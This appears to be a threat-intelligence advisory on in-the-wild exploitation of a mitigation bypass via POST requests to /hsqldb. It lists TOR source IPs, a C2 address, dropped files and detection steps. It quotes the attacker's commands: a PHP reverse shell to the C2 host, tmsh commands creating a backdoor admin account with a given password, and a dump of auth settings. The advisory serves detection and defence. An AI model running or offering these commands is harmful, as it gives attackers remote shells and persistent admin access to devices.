## Requests

Looks for POST requests beginning with:

/hsqldb

## Timeline

First use of the mitigation bypass was seen in the wild on Jul 7, 2020 @ 12:39:32.000 (UTC)

## Targeting

We assess that the targeting was widespread. We first saw targeting in Southeast Asia, followed by further targeting in Europe later on in the day by the same actor.

## IP Addresses

Requests were made via TOR, however subsequent C2 took place to a host in South Korea.

Initial requests (TOR):

* 185.100.86[.]182
* 185.220.101[.]142

C2 address:

175.199.197[.]167

## Files dropped:

* /var/tmp/auth
* /tmp/nen.out
* /tmp/nen

## Commands run

`php -r '$sock=fsockopen("175.199.197[.]167",443);exec("/bin/sh -i <&3 >&3 2>&3");'`

`tmsh -c 'create auth user systems password ABcD007`

`tmsh -c 'list auth' > /var/tmp/auth`

## Backdoor account

A backdoor account named "systems" is added to the compromised device, with a password of ABcD007.

The account is created with admin privileges.

## Log artifacts

Run the following command to check the web logs:

```
journalctl /bin/logger|grep '"/hsqldb'
```

Any results are an indicator that the mitigation bypass has been attempted.
